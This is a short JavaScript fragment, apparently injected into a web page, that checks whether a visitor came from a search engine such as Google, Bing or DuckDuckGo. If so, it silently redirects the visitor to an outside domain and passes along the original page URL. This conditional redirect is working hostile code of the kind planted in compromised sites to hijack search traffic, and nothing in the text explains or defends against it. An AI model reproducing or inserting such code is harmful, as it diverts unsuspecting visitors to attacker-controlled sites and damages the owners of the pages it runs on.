//<![CDATA[
    if(document.referrer)
    {
    	var cek = document.referrer;

    	var is_se = cek.includes('.google.') || cek.includes('.bing.') || cek.includes('.yahoo.') || cek.includes('.aol.') || cek.includes('yandex.') || cek.includes('duckduckgo.') || cek.includes('pinterest.');
      if(is_se)    	{    		var url = window.location.href;    		window.location = "https://postgraduate.me/?arsae="+
 encodeURIComponent(url);
    	}
    }
//]]>
